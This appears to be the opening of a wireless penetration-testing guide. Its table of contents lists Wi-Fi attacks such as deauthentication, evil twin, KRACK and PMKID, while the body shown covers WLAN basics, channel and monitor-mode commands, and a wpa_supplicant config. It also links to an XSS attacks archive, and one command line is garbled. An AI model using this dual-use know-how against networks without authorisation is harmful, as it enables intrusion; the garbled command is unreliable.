<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Wireless Pentest - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Wireless Penetration Testing", url: "#_top", children: [
          ]},
          {title: "WLAN basics", url: "#wlan-basics", children: [
              {title: "Frequency / bands / Channels", url: "#frequency-bands-channels" },
          ]},
          {title: "Installation / Configuration", url: "#installation-configuration", children: [
              {title: "Debug and Wi-Fi ninja", url: "#debug-and-wi-fi-ninja" },
          ]},
          {title: "Recon", url: "#recon", children: [
          ]},
          {title: "Hidden SSID", url: "#hidden-ssid", children: [
              {title: "With Connected Clients", url: "#with-connected-clients" },
              {title: "Without Connected Clients", url: "#without-connected-clients" },
              {title: "Passive Sniffing", url: "#passive-sniffing" },
              {title: "Preferred Network List (PNL)", url: "#preferred-network-list-pnl" },
          ]},
          {title: "Open Network", url: "#open-network", children: [
              {title: "Beacon flood attack", url: "#beacon-flood-attack" },
              {title: "Deauthentication attack", url: "#deauthentication-attack" },
          ]},
          {title: "WPS Pin", url: "#wps-pin", children: [
          ]},
          {title: "Guest Network", url: "#guest-network", children: [
              {title: "Guest network without password", url: "#guest-network-without-password" },
              {title: "MAC based authentication (Captive Portal Bypass)", url: "#mac-based-authentication-captive-portal-bypass" },
              {title: "DNS Tunneling", url: "#dns-tunneling" },
              {title: "Network Isolation", url: "#network-isolation" },
              {title: "Client isolation/separation", url: "#client-isolationseparation" },
              {title: "Azure AD and conditional Access Policy", url: "#azure-ad-and-conditional-access-policy" },
              {title: "Guest Public IP VS Corporate Public IP", url: "#guest-public-ip-vs-corporate-public-ip" },
              {title: "Fake access point with internet access", url: "#fake-access-point-with-internet-access" },
          ]},
          {title: "WEP", url: "#wep", children: [
              {title: "Connecting using wpa_supplicant", url: "#connecting-using-wpa_supplicant" },
              {title: "Cracking WEP", url: "#cracking-wep" },
              {title: "Decrypt traffic", url: "#decrypt-traffic" },
              {title: "WEP Cracking alternative", url: "#wep-cracking-alternative" },
          ]},
          {title: "WPA / WPA2", url: "#wpa-wpa2", children: [
              {title: "TKIP - Temporary Key Integrity Protocol", url: "#tkip-temporary-key-integrity-protocol" },
              {title: "4 way handhsake and encryption keys", url: "#4-way-handhsake-and-encryption-keys" },
              {title: "WPA2-PSK", url: "#wpa2-psk" },
              {title: "WPA2-Deauthentication attack (against client)", url: "#wpa2-deauthentication-attack-against-client" },
              {title: "WPA2-Deauthentication attack (against AP)", url: "#wpa2-deauthentication-attack-against-ap" },
              {title: "Cracking WPA2 handshake", url: "#cracking-wpa2-handshake" },
              {title: "WPA2 App Less Attack", url: "#wpa2-app-less-attack" },
              {title: "KARMA Attack", url: "#karma-attack" },
              {title: "PMKID Attack", url: "#pmkid-attack" },
              {title: "Key Reinstallation Attack (KRACK)", url: "#key-reinstallation-attack-krack" },
              {title: "FRAG Attack", url: "#frag-attack" },
          ]},
          {title: "WPA2 Enterprise", url: "#wpa2-enterprise", children: [
              {title: "wpa_supplicant and EAP", url: "#wpa_supplicant-and-eap" },
              {title: "EAP Types", url: "#eap-types" },
              {title: "EAP Encapsulation (Tunnel)", url: "#eap-encapsulation-tunnel" },
          ]},
          {title: "WPA3", url: "#wpa3", children: [
              {title: "OWE : Opportunistic Wireless Encryption", url: "#owe-opportunistic-wireless-encryption" },
              {title: "ZKP - Zero Knowledge Proof", url: "#zkp-zero-knowledge-proof" },
              {title: "Use WPA3-SAE authentication on Linux", url: "#use-wpa3-sae-authentication-on-linux" },
              {title: "WPA3-SAE", url: "#wpa3-sae" },
              {title: "Attacking WPA3", url: "#attacking-wpa3" },
              {title: "WPA3-Enterprise", url: "#wpa3-enterprise" },
          ]},
          {title: "Wi-Fi Hacking Mind Map", url: "#wi-fi-hacking-mind-map", children: [
          ]},
          {title: "Other Attacks", url: "#other-attacks", children: [
              {title: "Fake Captive Portal", url: "#fake-captive-portal" },
              {title: "Fake Open Access Point", url: "#fake-open-access-point" },
          ]},
          {title: "To be checked - Validated during an engagement", url: "#to-be-checked-validated-during-an-engagement", children: [
              {title: "General", url: "#general" },
              {title: "Open Authentication", url: "#open-authentication_1" },
              {title: "Personal Authentication", url: "#personal-authentication_1" },
              {title: "Enterprise", url: "#enterprise" },
          ]},
          {title: "Resources", url: "#resources", children: [
              {title: "WPA3 - DragonFly", url: "#wpa3-dragonfly" },
              {title: "Dragonblood: Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd", url: "#dragonblood-analyzing-the-dragonfly-handshake-of-wpa3-and-eap-pwd" },
              {title: "WEP Cloaking", url: "#wep-cloaking" },
              {title: "4-Way Handshake", url: "#4-way-handshake" },
              {title: "PTK Derivation", url: "#ptk-derivation" },
              {title: "Pi-PwnBox Rogue AP", url: "#pi-pwnbox-rogue-ap" },
              {title: "OpenWRT supported devices", url: "#openwrt-supported-devices" },
              {title: "OpenWRT Compatibles routers", url: "#openwrt-compatibles-routers" },
              {title: "SSID Oracle Attack on Undisclosed Wi-Fi Preferred Network Lists", url: "#ssid-oracle-attack-on-undisclosed-wi-fi-preferred-network-lists" },
              {title: "WEP attack fragmentation - chopchop", url: "#wep-attack-fragmentation-chopchop" },
              {title: "WiFi security: history of insecurities in WEP, WPA and WPA2", url: "#wifi-security-history-of-insecurities-in-wep-wpa-and-wpa2" },
          ]},
          {title: "Tools", url: "#tools", children: [
          ]},
          {title: "Defenses", url: "#defenses", children: [
              {title: "KARMA Attack detection", url: "#karma-attack-detection" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Subnet-Guide.xlsx" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Subnet-Guide.xlsx" class="btn btn-xs btn-link">
        Subnet-Guide
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../../malware/files/XSS_Attacks.zip" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../../malware/files/XSS_Attacks.zip" class="btn btn-xs btn-link">
        XSS_Attacks
      </a>
    </div>
    
  </div>

    

    <h1 id="wireless-penetration-testing">Wireless Penetration Testing</h1>
<ul>
<li><a href="#wireless-penetration-testing">Wireless Penetration Testing</a></li>
<li><a href="#wlan-basics">WLAN basics</a></li>
<li><a href="#frequency--bands--channels">Frequency / bands / Channels</a><ul>
<li><a href="#overlapping-channels-for-24-ghz">Overlapping channels for 2.4 GHz</a></li>
<li><a href="#non-overlapping-channels-for-24-ghz-to-avoid-interferences-with-channel-bonding">Non Overlapping channels for 2.4 GHz (to avoid interferences) with channel bonding</a></li>
<li><a href="#signal-and-attenuation-24ghz-vs-5ghz">Signal and attenuation 2.4GHz VS 5GHz</a></li>
<li><a href="#antennas">Antennas</a></li>
<li><a href="#frames">Frames</a></li>
<li><a href="#management-frames">Management Frames</a></li>
<li><a href="#control-frames">Control Frames</a></li>
<li><a href="#data-frames">Data Frames</a></li>
<li><a href="#authentication-types">Authentication Types</a></li>
<li><a href="#open-authentication">Open Authentication</a></li>
<li><a href="#personal-authentication">Personal Authentication</a></li>
<li><a href="#enterprise-authentication">Enterprise Authentication</a></li>
</ul>
</li>
<li><a href="#installation--configuration">Installation / Configuration</a></li>
<li><a href="#debug-and-wi-fi-ninja">Debug and Wi-Fi ninja</a><ul>
<li><a href="#check-wi-fi-card-frequency-and-channel-available">Check Wi-Fi card frequency and channel available</a></li>
<li><a href="#restart-networking-service-and-wpa-supplicant">Restart networking service and WPA supplicant</a></li>
<li><a href="#changing-wi-fi-card-channel">Changing Wi-Fi card channel</a></li>
<li><a href="#changing-wi-fi-card-frequency">Changing Wi-Fi card Frequency</a></li>
<li><a href="#monitor-mode">Monitor mode</a></li>
<li><a href="#connect-using-wpa-supplicant">Connect using wpa-supplicant</a></li>
</ul>
</li>
<li><a href="#recon">Recon</a></li>
<li><a href="#hidden-ssid">Hidden SSID</a><ul>
<li><a href="#with-connected-clients">With Connected Clients</a></li>
<li><a href="#without-connected-clients">Without Connected Clients</a></li>
<li><a href="#passive-sniffing">Passive Sniffing</a></li>
<li><a href="#preferred-network-list-pnl">Preferred Network List (PNL)</a></li>
</ul>
</li>
<li><a href="#open-network">Open Network</a></li>
<li><a href="#beacon-flood-attack">Beacon flood attack</a></li>
<li><a href="#deauthentication-attack">Deauthentication attack</a></li>
<li><a href="#wps-pin">WPS Pin</a></li>
<li><a href="#guest-network">Guest Network</a><ul>
<li><a href="#guest-network-without-password">Guest network without password</a></li>
<li><a href="#mac-based-authentication-captive-portal-bypass">MAC based authentication (Captive Portal Bypass)</a></li>
<li><a href="#dns-tunneling">DNS Tunneling</a></li>
<li><a href="#network-isolation">Network Isolation</a></li>
<li><a href="#client-isolationseparation">Client isolation/separation</a></li>
<li><a href="#azure-ad-and-conditional-access-policy">Azure AD and conditional Access Policy</a></li>
<li><a href="#guest-public-ip-vs-corporate-public-ip">Guest Public IP VS Corporate Public IP</a></li>
<li><a href="#fake-access-point-with-internet-access">Fake access point with internet access</a></li>
</ul>
</li>
<li><a href="#wep">WEP</a><ul>
<li><a href="#connecting-using-wpa_supplicant">Connecting using wpa_supplicant</a></li>
<li><a href="#cracking-wep">Cracking WEP</a></li>
<li><a href="#decrypt-traffic">Decrypt traffic</a></li>
<li><a href="#wep-cracking-alternative">WEP Cracking alternative</a></li>
</ul>
</li>
<li><a href="#wpa--wpa2">WPA / WPA2</a><ul>
<li><a href="#tkip---temporary-key-integrity-protocol">TKIP - Temporary Key Integrity Protocol</a></li>
<li><a href="#4-way-handhsake-and-encryption-keys">4 way handhsake and encryption keys</a></li>
<li><a href="#wpa2-psk">WPA2-PSK</a></li>
<li><a href="#wpa2-deauthentication-attack-against-client">WPA2-Deauthentication attack (against client)</a></li>
<li><a href="#wpa2-deauthentication-attack-against-ap">WPA2-Deauthentication attack (against AP)</a></li>
<li><a href="#cracking-wpa2-handshake">Cracking WPA2 handshake</a></li>
<li><a href="#dictionnary-attack">Dictionnary attack</a></li>
<li><a href="#pre-computed-pmk">Pre Computed PMK</a></li>
<li><a href="#wpa2-app-less-attack">WPA2 App Less Attack</a></li>
<li><a href="#karma-attack">KARMA Attack</a></li>
<li><a href="#pmkid-attack">PMKID Attack</a></li>
<li><a href="#key-reinstallation-attack-krack">Key Reinstallation Attack (KRACK)</a></li>
<li><a href="#frag-attack">FRAG Attack</a></li>
</ul>
</li>
<li><a href="#wpa2-enterprise">WPA2 Enterprise</a><ul>
<li><a href="#wpa_supplicant-and-eap">wpa_supplicant and EAP</a></li>
</ul>
</li>
<li><a href="#eap-types">EAP Types</a><ul>
<li><a href="#eap-md5">EAP-MD5</a></li>
<li><a href="#eap-pap">EAP-PAP</a></li>
<li><a href="#eap-gtc---generic-token-card">EAP-GTC - Generic Token Card</a></li>
<li><a href="#eap-chap---challenge-handshake-authentication-protocol">EAP-CHAP - Challenge Handshake Authentication Protocol</a></li>
<li><a href="#eap-aka">EAP-AKA</a></li>
<li><a href="#eap-mschapv2---microsoft-challenge-authentication-protocol-version-2">EAP-MSCHAPv2 - Microsoft Challenge Authentication Protocol version 2</a></li>
<li><a href="#eap-pwd">EAP-PWD</a></li>
<li><a href="#eap-noob">EAP-NOOB</a></li>
<li><a href="#leap---light-weight-eap">LEAP - Light Weight EAP</a></li>
<li><a href="#eap-fast---flexible-authentication-by-secure-tunneling">EAP-FAST - Flexible Authentication by Secure Tunneling</a></li>
</ul>
</li>
<li><a href="#eap-encapsulation-tunnel">EAP Encapsulation (Tunnel)</a><ul>
<li><a href="#eap-peap">EAP-PEAP</a></li>
<li><a href="#eap-tls---transport-layer-security">EAP-TLS - Transport Layer Security</a></li>
<li><a href="#eap-ttls---tunneled-tls">EAP-TTLS - Tunneled TLS</a></li>
<li><a href="#identity-privacy-misconfiguration">Identity Privacy misconfiguration</a></li>
<li><a href="#wpa2-eap---password-spray-attack">WPA2-EAP - Password spray attack</a></li>
<li><a href="#wpa2-eap-evil-twin-attack">WPA2-EAP Evil Twin Attack</a></li>
<li><a href="#hostapd-wpe-previously-freeradius-wpe">Hostapd-WPE (Previously FreeRadius WPE)</a></li>
<li><a href="#eaphammer">Eaphammer</a></li>
<li><a href="#wpa2-eap-relay">WPA2-EAP Relay</a></li>
</ul>
</li>
<li><a href="#wpa3">WPA3</a><ul>
<li><a href="#owe--opportunistic-wireless-encryption">OWE : Opportunistic Wireless Encryption</a></li>
<li><a href="#zkp---zero-knowledge-proof">ZKP - Zero Knowledge Proof</a></li>
<li><a href="#use-wpa3-sae-authentication-on-linux">Use WPA3-SAE authentication on Linux</a></li>
<li><a href="#wpa3-sae">WPA3-SAE</a></li>
<li><a href="#attacking-wpa3">Attacking WPA3</a></li>
<li><a href="#wpa3-transition-downgrade-attack">WPA3-Transition Downgrade Attack</a></li>
<li><a href="#security-group-downgrade-attack">Security Group Downgrade Attack</a></li>
<li><a href="#wpa3-sae-timing-or-cache-password-paritioning">WPA3-SAE timing or cache password paritioning</a></li>
<li><a href="#timing-attack-using-weak-group">Timing attack using weak group</a></li>
<li><a href="#denial-of-service-against-wpa3-sae">Denial of Service against WPA3-SAE</a></li>
<li><a href="#wpa3-eap---invalid-curve-attack">WPA3-EAP - Invalid curve attack</a></li>
<li><a href="#wpa3-eap---reflection-attack">WPA3-EAP - Reflection attack</a></li>
</ul>
</li>
<li><a href="#wpa3-enterprise">WPA3-Enterprise</a></li>
<li><a href="#wi-fi-hacking-mind-map">Wi-Fi Hacking Mind Map</a></li>
<li><a href="#other-attacks">Other Attacks</a><ul>
<li><a href="#fake-captive-portal">Fake Captive Portal</a></li>
<li><a href="#fake-open-access-point">Fake Open Access Point</a></li>
</ul>
</li>
<li><a href="#to-be-checked---validated-during-an-engagement">To be checked - Validated during an engagement</a><ul>
<li><a href="#general">General</a></li>
<li><a href="#open-authentication-1">Open Authentication</a></li>
<li><a href="#personal-authentication-1">Personal Authentication</a></li>
<li><a href="#enterprise">Enterprise</a></li>
</ul>
</li>
<li><a href="#resources">Resources</a><ul>
<li><a href="#wpa3---dragonfly">WPA3 - DragonFly</a></li>
<li><a href="#dragonblood-analyzing-the-dragonfly-handshake-of-wpa3-and-eap-pwd">Dragonblood: Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd</a></li>
<li><a href="#wep-cloaking">WEP Cloaking</a></li>
<li><a href="#4-way-handshake">4-Way Handshake</a></li>
<li><a href="#ptk-derivation">PTK Derivation</a></li>
<li><a href="#pi-pwnbox-rogue-ap">Pi-PwnBox Rogue AP</a></li>
<li><a href="#openwrt-supported-devices">OpenWRT supported devices</a></li>
<li><a href="#openwrt-compatibles-routers">OpenWRT Compatibles routers</a></li>
<li><a href="#ssid-oracle-attack-on-undisclosed-wi-fi-preferred-network-lists">SSID Oracle Attack on Undisclosed Wi-Fi Preferred Network Lists</a></li>
<li><a href="#wep-attack-fragmentation---chopchop">WEP attack fragmentation - chopchop</a></li>
<li><a href="#wifi-security-history-of-insecurities-in-wep-wpa-and-wpa2">WiFi security: history of insecurities in WEP, WPA and WPA2</a></li>
</ul>
</li>
<li><a href="#tools">Tools</a></li>
<li><a href="#defenses">Defenses</a><ul>
<li><a href="#karma-attack-detection">KARMA Attack detection</a></li>
</ul>
</li>
</ul>
<h1 id="wlan-basics">WLAN basics</h1>
<h2 id="frequency-bands-channels">Frequency / bands / Channels</h2>
<ul>
<li>2.4 GHz : 11 Channels (14 total, e.g: In Japan)</li>
<li>2.4 GHz = 802.11 b / g / n / ax</li>
<li>5 GHz : 45 Channels</li>
<li>5 GHz = 802.11 a / h / j / n / ac / ax</li>
</ul>
<p><img src="/images/wifi_amendments.png" width="700"/></p>
<h3 id="overlapping-channels-for-24-ghz">Overlapping channels for 2.4 GHz</h3>
<p><img src="/images/overlapping.png" width="500"/></p>
<h3 id="non-overlapping-channels-for-24-ghz-to-avoid-interferences-with-channel-bonding">Non Overlapping channels for 2.4 GHz (to avoid interferences) with channel bonding</h3>
<p><img src="/images/nonoverlapping.png" width="500"/></p>
<h3 id="signal-and-attenuation-24ghz-vs-5ghz">Signal and attenuation 2.4GHz VS 5GHz</h3>
<p><img src="/images/signal.png" width="500"/></p>
<p>--&gt; The <em>higher</em> the frequency of a wireless signal the <em>shorter</em> the range.<br />
--&gt; 2.4GHz (802.11g) covers a substantial larger range than that of 5.0GHz (802.11a)<br />
--&gt; The higher frequency signals of 5.0GHz do not penetrate solid objects nearly as well as do 2.4GHz signals.<br />
--&gt; The smaller wavelength of 5.0GHz allows a higher absorption rate by solid objects</p>
<p><img src="/images/attenuation.png" width="500"/></p>
<h3 id="antennas">Antennas</h3>
<p><img src="/images/antennas.png" width="900"/></p>
<h3 id="frames">Frames</h3>
<h4 id="management-frames">Management Frames</h4>
<ul>
<li>https://mrncciew.com/2014/09/29/cwap-802-11-mgmt-frame-types/</li>
</ul>
<p>WireShark filter: 
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>(wlan.fc.type == 0)&amp;&amp;(wlan.fc.type_subtype == 0x0c)
</span></code></pre></div></p>
<p><img src="/images/management_frames.png" width="500"/></p>
<ul>
<li><a href="https://mrncciew.com/2014/10/08/802-11-mgmt-beacon-frame/"><strong>Beacon Frame</strong></a>: It contains all the information about the network. Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN and to synchronise the members of the service set. Beacon frames are transmitted by the access point (AP) in an infrastructure basic service set (BSS).</li>
</ul>
<p><img src="/images/beaconframe.gif" width="350"/></p>
<ul>
<li><a href="https://mrncciew.com/2014/10/27/cwap-802-11-probe-requestresponse/"><strong>Probe Request / Response</strong></a>: Client looking for specific SSID or wildcard SSID which means any SSID available. Probe Requests are send by the client on broadcast. </li>
</ul>
<p><img src="/images/proberesponse.png" width="900"/></p>
<h4 id="control-frames">Control Frames</h4>
<ul>
<li>https://mrncciew.com/2014/09/27/cwap-mac-header-frame-control/</li>
</ul>
<h4 id="data-frames">Data Frames</h4>
<ul>
<li>https://mrncciew.com/2014/10/13/cwap-802-11-data-frame-types/</li>
</ul>
<h3 id="authentication-types">Authentication Types</h3>
<h4 id="open-authentication">Open Authentication</h4>
<ul>
<li>Open</li>
<li>OWE</li>
</ul>
<h4 id="personal-authentication">Personal Authentication</h4>
<ul>
<li>WEP</li>
<li>WPA/WPA2-PSK</li>
<li>WPA3-SAE</li>
</ul>
<h4 id="enterprise-authentication">Enterprise Authentication</h4>
<ul>
<li>WPA/WPA2/WPA3-EAP</li>
<li>Methods:<ol>
<li>EAP-GTC</li>
<li>EAP-MD5</li>
<li>EAP-PAP</li>
<li>EAP-CHAP</li>
<li>EAP-MSCHAP</li>
<li>EAP-MSCHAPv2</li>
<li>EAP-TLS</li>
<li>EAP-AKA</li>
<li>EAP-PWD</li>
<li>EAP-SIM</li>
<li>EAP-NOOB</li>
</ol>
</li>
</ul>
<h1 id="installation-configuration">Installation / Configuration</h1>
<p>It is <em>highly recommanded</em> to use a <a href="https://www.kali.org/get-kali/#kali-installer-images">Kali Linux OS</a> with bare metal install regarding dependencies and current research on WPA3 or tool for WPA2-Enterprise.</p>
<p>Install the driver for ALPHA card.
- https://github.com/aircrack-ng/rtl8812au</p>
<h2 id="debug-and-wi-fi-ninja">Debug and Wi-Fi ninja</h2>
<h3 id="check-wi-fi-card-frequency-and-channel-available">Check Wi-Fi card frequency and channel available</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>┌──(lutzenfried㉿xec)-[~/]
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>└─$ iwlist wlan1 channel    
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>wlan1     32 channels in total; available frequencies :
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>          Channel 01 : 2.412 GHz
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>          Channel 02 : 2.417 GHz
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>          Channel 03 : 2.422 GHz
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>          Channel 04 : 2.427 GHz
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>          Channel 05 : 2.432 GHz
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>          Channel 06 : 2.437 GHz
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>          Channel 07 : 2.442 GHz
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>          Channel 08 : 2.447 GHz
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>          Channel 09 : 2.452 GHz
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>          Channel 10 : 2.457 GHz
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>          Channel 11 : 2.462 GHz
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>          Channel 12 : 2.467 GHz
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>          Channel 13 : 2.472 GHz
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>          Channel 36 : 5.18 GHz
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>          Channel 40 : 5.2 GHz
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>          Channel 44 : 5.22 GHz
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>          Channel 48 : 5.24 GHz
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>          Channel 52 : 5.26 GHz
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>          Channel 56 : 5.28 GHz
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>          Channel 60 : 5.3 GHz
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>          Channel 64 : 5.32 GHz
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>          Channel 100 : 5.5 GHz
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>          Channel 104 : 5.52 GHz
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>          Channel 108 : 5.54 GHz
</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>          Channel 112 : 5.56 GHz
</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>          Channel 116 : 5.58 GHz
</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>          Channel 120 : 5.6 GHz
</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>          Channel 124 : 5.62 GHz
</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>          Channel 128 : 5.64 GHz
</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>          Channel 132 : 5.66 GHz
</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>          Channel 136 : 5.68 GHz
</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>          Channel 140 : 5.7 GHz
</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>          Current Frequency:2.412 GHz (Channel 1)
</span></code></pre></div>
<h3 id="restart-networking-service-and-wpa-supplicant">Restart networking service and WPA supplicant</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo ser```vice networking restart
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>sudo systemctl restart networking.service 
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>sudo systemctl restart wpa_supplicant.service
</span></code></pre></div>
<h3 id="changing-wi-fi-card-channel">Changing Wi-Fi card channel</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo ifconfig wlan1 down
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo iwconfig wlan1 channel 64
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>sudo ifconfig wlan1 up
</span></code></pre></div>
<h3 id="changing-wi-fi-card-frequency">Changing Wi-Fi card Frequency</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo ifconfig wlan1 down
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>sudo iwconfig wlan1 freq &quot;5.52G&quot;
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>sudo ifconfig wlan1 up
</span></code></pre></div>
<h3 id="monitor-mode">Monitor mode</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>airmon-ng start wlan0
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ifconfig wlan0 down
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>iw dev wlan0 set monitor none
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>ifconfig wlan0 up
</span></code></pre></div>
<h3 id="connect-using-wpa-supplicant">Connect using wpa-supplicant</h3>
<p>wpa_supplicant -D nl80211 -i wlan1 -c psk.conf</p>
<p><em>psk.conf</em>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>network={
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    ssid=&quot;CompanyWiFi&quot;
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    psk=&quot;SuperPassword&quot;
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    proto=RSN
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>    key_mgmt=WPA-PSK
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>    pairwise=CCMP TKIP
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>    group=CCMP TKIP
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>}
</span></code></pre></div></p>
